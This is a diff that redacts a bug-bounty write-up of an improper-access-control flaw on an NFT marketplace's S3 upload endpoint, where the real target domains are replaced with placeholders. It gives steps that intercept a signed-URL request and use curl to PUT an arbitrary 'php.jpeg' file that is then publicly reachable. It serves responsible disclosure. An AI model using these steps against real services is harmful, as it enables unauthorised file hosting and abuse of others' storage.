@@ -8,8 +8,7 @@ In September 2024, I discovered a vulnerability on a major NFT marketplace platf
 
 ## Vulnerability Summary
 
-**Target:** creators.magiceden.io  
-**Asset:** creator-hub-prod.s3.us-east-2.amazonaws.com  
+**Asset:** Public S3 Bucket
 **Type:** Improper Access Control / Public File Upload  
 **Report ID:** #2715239  
 **Platform:** HackerOne  
@@ -26,14 +25,14 @@ The backend endpoint responsible for generating signed S3 URLs (`/api/upload/sig
 ## Steps to Reproduce
 
 ### 1. Navigate to Creator Dashboard
-Visit `https://creators.magiceden.io/dashboard` and initiate a new listing.
+Initiate a new listing.
 
 ### 2. Upload a File and Intercept Request
 Use Burp Suite to intercept the file upload process. Look for a POST request to:
 
 ```
 POST /api/upload/signed-url HTTP/2
-Host: api-creators.magiceden.io
+Host: [REDACTED]
 Authorization: Bearer <access_token>
 Content-Type: application/json
 
@@ -46,14 +45,14 @@ Content-Type: application/json
 The server responds with a signed S3 URL like:
 
 ```
-https://creator-hub-prod.s3.us-east-2.amazonaws.com/example_image_1726204966358.jpeg?X-Amz-Algorithm=...
+https://[REDACTED].s3.us-east-2.amazonaws.com/example_image_1726204966358.jpeg?X-Amz-Algorithm=...
 ```
 
 ### 4. Upload Arbitrary File
 Upload a file directly via `curl`, bypassing the frontend:
 
 ```bash
-curl -X PUT -T yourfile.php.jpeg "https://creator-hub-prod.s3.us-east-2.amazonaws.com/example_image_1726204966358.jpeg?X-Amz-Algorithm=..."
+curl -X PUT -T yourfile.php.jpeg "https://[REDACTED].s3.us-east-2.amazonaws.com/example_image_1726204966358.jpeg?X-Amz-Algorithm=..."
 ```
 
 ### 5. Public Access Without Authentication
@@ -61,7 +60,7 @@ Visit the resulting URL directly in a browser. No login is required to access th
 
 Example:
 ```
-https://creator-hub-prod.s3.us-east-2.amazonaws.com/aasdfasdf_pfp_1726204966358.jpeg
+https://[REDACTED].s3.us-east-2.amazonaws.com/aasdfasdf_pfp_1726204966358.jpeg
 ```
 
 ### 6. Enumerate Other Files (Optional)
